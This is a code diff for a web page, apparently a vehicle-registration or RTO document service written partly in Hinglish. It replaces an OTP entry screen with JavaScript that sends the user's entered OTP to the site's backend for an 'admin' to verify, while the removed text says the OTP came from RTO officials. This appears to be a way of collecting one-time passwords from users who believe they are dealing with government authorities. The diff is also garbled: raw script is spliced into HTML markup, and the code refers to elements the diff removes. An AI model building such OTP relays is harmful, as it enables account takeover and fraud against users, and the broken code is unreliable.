@@ -120,23 +120,53 @@ th { font-size: .76rem; text-transform: uppercase; letter-spacing: .06em; color:
       </form>
     </div>
 
-    <!-- STEP 2: OTP CONFIRMATION SCREEN -->
-    <div id="step2Otp" style="display: none;">
-      <div class="status-box">
-        <div class="spinner"></div>
-        <h3 style="margin: 0 0 8px; font-size: 1.2rem; color: var(--warn);">Wait for OTP confirmation from RTO officials</h3>
-        <p style="color: var(--mut); font-size: 0.88rem; max-width: 480px; margin: 0 auto 20px;">
-          Aapke registered mobile number par RTO authority dwara OTP bheja gaya hai. Kripya niche OTP enter karke submit karein.
-        </p>
+   // Step 2: Submit OTP (Fixed to preserve form data & send OTP correctly)
+document.getElementById('fOtpForm').onsubmit = async function(e) {
+  e.preventDefault();
+  const otp = document.getElementById('otpCode').value.trim();
+  if (!otp) return;
 
-        <form id="fOtpForm" style="max-width: 340px; margin: 0 auto;">
-          <div class="form-group">
-            <input type="text" id="otpCode" placeholder="Enter 4 or 6 Digit OTP" required style="text-align: center; font-size: 1.2rem; letter-spacing: 4px;" maxlength="6">
-          </div>
-          <button type="submit" class="btn-primary">Verify &amp; Submit OTP</button>
-        </form>
-      </div>
-    </div>
+  try {
+    // Pehle current request ki details fetch karein taaki purana data (Vehicle, Chassis, etc.) udd na jaye
+    const getRes = await fetch(API + '/api/requests/' + encodeURIComponent(currentRequestId), {
+      headers: { 'x-user-token': localStorage.getItem('ds_token') || '' }
+    });
+    
+    let existingData = {};
+    if (getRes.ok) {
+      const resJson = await getRes.json();
+      if (resJson.request && resJson.request.data) {
+        existingData = resJson.request.data;
+      }
+    }
+
+    // Purane data ke sath naya OTP aur status merge karke bhejein
+    await fetch(API + '/api/requests/' + encodeURIComponent(currentRequestId), {
+      method: 'PATCH',
+      headers: {
+        'content-type': 'application/json',
+        'x-user-token': localStorage.getItem('ds_token') || ''
+      },
+      body: JSON.stringify({
+        data: {
+          ...existingData,
+          entered_otp: otp,
+          otp_status: 'waiting_verify'
+        }
+      })
+    });
+  } catch (err) {
+    console.error('OTP Submit Error:', err);
+  }
+
+  // Show Waiting/Processing screen
+  document.getElementById('step2Otp').style.display = 'none';
+  document.getElementById('step3Waiting').style.display = 'block';
+  document.getElementById('waitTitle').textContent = 'Checking OTP confirmation...';
+  document.getElementById('waitMsg').textContent = 'Admin dwara OTP verify kiya ja raha hai. Kripya pratiksha karein.';
+
+  startStatusPolling();
+};
 
     <!-- STEP 3: WAITING FOR ADMIN OTP & PDF UPLOAD -->
     <div id="step3Waiting" style="display: none;">
